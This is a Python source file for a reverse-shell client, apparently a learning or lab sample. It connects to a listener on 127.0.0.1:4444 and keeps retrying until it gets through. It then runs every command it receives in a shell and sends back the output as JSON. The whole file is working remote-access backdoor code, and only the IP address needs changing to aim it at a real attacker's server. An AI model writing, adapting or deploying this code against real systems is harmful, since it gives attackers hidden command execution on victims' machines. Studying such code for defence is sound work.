import socket
import json
import subprocess
import os
import time


class Client():

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def _send(self, data):
        """Sends data as json to conn."""

        json_data = json.dumps(data)
        self.sock.send(json_data.encode('utf-8'))

    def _receive(self):
        """Return data received form the conn."""

        json_data = ""
        while True:
            try:
                json_data += self.sock.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def _exec_command(self, command):

        try:

            if command[:2] == "cd":
                try:
                    print(command[3:])
                    os.chdir(command[3:])
                except OSError:
                    return f"Location {command[2:]} does not exits!"
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                result = process.stdout.read() + process.stderr.read()
                return result
        except Exception as e:
           return e

    def _handle_server(self):
        while True:
            command = self._receive()
            
            if command == "exit":
                self.sock.close()
            else:
                result = self._exec_command(command)
                self._send(result)

    def connect(self, ip, port):

        while True:
            try:
                self.sock.connect((ip, port))
                break
            except ConnectionRefusedError:
                time.sleep(5)

        self._handle_server()


if __name__ == "__main__":
    server = Client()
    server.connect("127.0.0.1", 4444)